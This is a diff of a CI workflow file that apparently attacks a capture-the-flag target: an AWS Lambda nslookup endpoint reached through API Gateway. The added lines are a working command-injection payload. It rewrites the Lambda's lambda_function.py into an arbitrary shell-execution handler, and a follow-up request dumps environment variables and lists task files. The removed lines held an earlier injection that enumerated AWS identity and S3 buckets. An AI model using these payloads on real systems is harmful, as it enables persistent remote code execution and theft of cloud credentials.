@@ -25,11 +25,20 @@ jobs:
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          # This payload runs nslookup, checks who the Lambda is running as, 
-          # and lists all S3 buckets using the Lambda's internal AWS CLI!
-          PAYLOAD='{"domain": "127.0.0.1; aws sts get-caller-identity; aws s3 ls"}'
+          # This payload uses command injection to overwrite lambda_function.py 
+          # so that ANY command we pass in 'domain' gets executed AND returned in the website response!
+          PAYLOAD='{"domain": "127.0.0.1; echo '\''import json, subprocess'\'' > /var/task/lambda_function.py; echo '\''def lambda_handler(e, c):'\'' >> /var/task/lambda_function.py; echo '\''    cmd = e.get(\"domain\", \"id\")'\'' >> /var/task/lambda_function.py; echo '\''    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)'\'' >> /var/task/lambda_function.py; echo '\''    return {\"statusCode\": 200, \"body\": res.stdout}'\'' >> /var/task/lambda_function.py"}'
           
-          echo "=== TESTING INTERNAL VPC AWS CLI ==="
+          echo "=== 1. OVERWRITING LAMBDA CODE VIA INJECTION ==="
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
+          
+          echo ""
+          echo "=== 2. REQUESTING THE FLAG ==="
+          # Now that the code is rewritten, let's ask it to run 'env' or find the flag file!
+          FLAG_PAYLOAD='{"domain": "env && ls -la /var/task"}'
+          
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "$FLAG_PAYLOAD"
